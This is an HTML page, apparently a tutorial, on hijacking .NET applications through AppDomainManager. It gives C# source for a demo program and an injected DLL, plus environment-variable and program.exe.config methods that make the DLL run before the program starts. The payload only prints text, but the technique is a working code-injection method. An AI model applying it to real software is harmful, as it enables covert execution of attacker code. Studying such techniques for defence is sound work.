<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Hijack CLR</title>
</head><body><b>1. Use Visual Studio, select c# development environment, create a new console application, project name: program</b>, the code is as follows:<br/>
<br/>
using System;<br/>
<br/>
public class Program<br/>
{<br/>
&nbsp; &nbsp; public static void Main()<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; Console.WriteLine("Inside the App");<br/>
&nbsp; &nbsp; }<br/>
}<br/>
<br/>
Compile and generate program.exe<br/>
<br/>
<br/>
<b>2. write payload Dll</b><br/>
Select c# development environment, create a new class library, project name: DomainManager, the code is as follows:<br/>
<br/>
using System;<br/>
<br/>
namespace DomainManager<br/>
{<br/>
&nbsp; &nbsp; public class InjectedDomainManager : AppDomainManager<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; public override void InitializeNewDomain(AppDomainSetup appDomainInfo)<br/>
&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; base.InitializeNewDomain(appDomainInfo);<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Console.WriteLine("Blah From AppMgr");<br/>
&nbsp; &nbsp; &nbsp; &nbsp; }<br/>
&nbsp; &nbsp; }<br/>
}<br/>
<br/>
Compile and generate DomainManager.dll<br/>
<br/>
<br/>
<b>3, set the AppDomainManager hijacking program to start</b><br/>
Put DomainManager.dll in the same directory<br/>
<br/>
method 1:<br/>
Cmd sets the environment variable:<br/>
<br/>
set APPDOMAIN_MANAGER_ASM=DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null<br/>
<br/>
set APPDOMAIN_MANAGER_TYPE=DomainManager.InjectedDomainManager<br/>
Execute program.exe, and by looking at the echo, it is found that DomainManager.dll is executed before program.exe.<br/>
<br/>
Successful implementation of hijacking, complete operation as shown below<br/>
<br/>
<img src="image.png" /><br/>
<br/>
Note: the order of execution<br/>
The method of setting environment variables through cmd will <b>only work on the current cmd</b>, not enough.<br/>
<br/>
<br/>
Method 2:<br/>
A more general approach: configuring the config file<br/>
<br/>
Create a new program.exe.config with the following contents:<br/>
<br/>
&lt;?xml version="1.0" encoding="utf-8"?&gt;<br/>
&lt;configuration&gt;<br/>
&nbsp; &lt;startup&gt;<br/>
&nbsp; &nbsp; &lt;supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.0"/&gt;<br/>
&nbsp; &lt;/startup&gt;<br/>
&nbsp; &nbsp; &lt;runtime&gt;<br/>
&nbsp; &nbsp; &nbsp; &lt;appDomainManagerType value="DomainManager.InjectedDomainManager" /&gt;<br/>
&nbsp; &nbsp; &nbsp; &lt;appDomainManagerAssembly<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;value="DomainManager, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" /&gt;<br/>
&nbsp; &nbsp; &lt;/runtime&gt;<br/>
&lt;/configuration&gt;<br/>
Note:<br/>
<br/>
Config file naming format: exe+.config<br/>
<br/>
Successful implementation of hijacking, complete operation as shown below<br/>
<img src="image 2.png" /><br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>